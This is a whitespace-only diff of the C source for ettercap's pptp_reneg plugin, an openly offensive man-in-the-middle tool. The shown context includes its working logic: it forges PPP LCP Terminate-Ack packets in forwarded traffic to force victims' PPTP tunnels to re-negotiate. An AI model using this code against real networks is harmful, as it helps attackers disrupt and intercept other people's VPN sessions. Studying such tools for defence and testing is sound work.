@@ -2,7 +2,7 @@
     pptp_reneg -- ettercap plugin -- Forces re-negotiation on an existing PPTP tunnel
 
     Copyright (C) ALoR & NaGA
-    
+
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
@@ -56,32 +56,32 @@ static void parse_ppp(struct packet_object *po);
 static int found_in_list(struct packet_object *po);
 
 /* plugin operations */
-struct plugin_ops pptp_reneg_ops = { 
+struct plugin_ops pptp_reneg_ops = {
    /* ettercap version MUST be the global EC_VERSION */
-   .ettercap_version =  EC_VERSION,                        
+   .ettercap_version =  EC_VERSION,
    /* the name of the plugin */
-   .name =              "pptp_reneg",  
-    /* a short description of the plugin (max 50 chars) */                    
-   .info =              "PPTP: Forces tunnel re-negotiation",  
-   /* the plugin version. */ 
-   .version =           "1.0",   
+   .name =              "pptp_reneg",
+    /* a short description of the plugin (max 50 chars) */
+   .info =              "PPTP: Forces tunnel re-negotiation",
+   /* the plugin version. */
+   .version =           "1.0",
    /* activation function */
    .init =              &pptp_reneg_init,
-   /* deactivation function */                     
+   /* deactivation function */
    .fini =              &pptp_reneg_fini,
 };
 
 /**********************************************************/
 
 /* this function is called on plugin load */
-int plugin_load(void *handle) 
+int plugin_load(void *handle)
 {
    return plugin_register(handle, &pptp_reneg_ops);
 }
 
 /******************* STANDARD FUNCTIONS *******************/
 
-static int pptp_reneg_init(void *dummy) 
+static int pptp_reneg_init(void *dummy)
 {
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
@@ -90,13 +90,13 @@ static int pptp_reneg_init(void *dummy)
    }
 
    USER_MSG("pptp_reneg: plugin running...\n");
-   
+
    hook_add(HOOK_PACKET_PPP, &parse_ppp);
-   return PLUGIN_RUNNING;   
+   return PLUGIN_RUNNING;
 }
 
 
-static int pptp_reneg_fini(void *dummy) 
+static int pptp_reneg_fini(void *dummy)
 {
    struct call_list *p;
 
@@ -122,15 +122,15 @@ static void parse_ppp(struct packet_object *po)
    struct ppp_lcp_header *lcp;
    struct ppp_header *ppp;
    char tmp[MAX_ASCII_ADDR_LEN];
-   
+
    /* It is pointless to modify packets that won't be forwarded */
-   if (!(po->flags & PO_FORWARDABLE)) 
-      return; 
+   if (!(po->flags & PO_FORWARDABLE))
+      return;
 
    /* Do not terminate same tunnel twice */
    if (found_in_list(po))
       return;
-      
+
    ppp = (struct ppp_header *)po->L4.header;
    lcp = (struct ppp_lcp_header *)(ppp + 1);
 
@@ -143,13 +143,13 @@ static void parse_ppp(struct packet_object *po)
    ppp->address = 0xff;
    ppp->control = 0x3;
 
-   lcp->code = PPP_TERMINATE_ACK;      
+   lcp->code = PPP_TERMINATE_ACK;
    lcp->ident = 0x01; /* or a higher value */
    lcp->length = htons(sizeof(*lcp));
 
    /* Notify the changes to previous decoders */
-   po->flags |= PO_MODIFIED; 
-   /* Use DATA.delta to notify ppp packet len modification */ 
+   po->flags |= PO_MODIFIED;
+   /* Use DATA.delta to notify ppp packet len modification */
    po->DATA.delta = sizeof(struct ppp_lcp_header) + sizeof(struct ppp_header) - po->L4.len;
 
    USER_MSG("pptp_reneg: Forced tunnel re-negotiation  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
@@ -161,16 +161,16 @@ static void parse_ppp(struct packet_object *po)
 static int found_in_list(struct packet_object *po)
 {
    struct call_list *p;
-   
+
    /* Check if the addresses are consistent */
    if (ip_addr_null(&po->L3.dst) || ip_addr_null(&po->L3.src))
       return 1;
-      
+
    /* Check if we already terminated this tunnel once */
    SLIST_FOREACH(p, &call_table, next) {
-      if ( (!ip_addr_cmp(&po->L3.src, &p->ip[0]) && 
-            !ip_addr_cmp(&po->L3.dst, &p->ip[1])) || 
-           (!ip_addr_cmp(&po->L3.src, &p->ip[1]) && 
+      if ( (!ip_addr_cmp(&po->L3.src, &p->ip[0]) &&
+            !ip_addr_cmp(&po->L3.dst, &p->ip[1])) ||
+           (!ip_addr_cmp(&po->L3.src, &p->ip[1]) &&
             !ip_addr_cmp(&po->L3.dst, &p->ip[0])) )
          return 1;
    }
@@ -178,13 +178,13 @@ static int found_in_list(struct packet_object *po)
    SAFE_CALLOC(p, 1, sizeof(struct call_list));
    memcpy (&(p->ip[0]), &po->L3.src, sizeof(struct ip_addr));
    memcpy (&(p->ip[1]), &po->L3.dst, sizeof(struct ip_addr));
-   
+
    SLIST_INSERT_HEAD(&call_table, p, next);
 
-   return 0;      
+   return 0;
 }
 
 /* EOF */
 
 // vim:ts=3:expandtab
- 
+
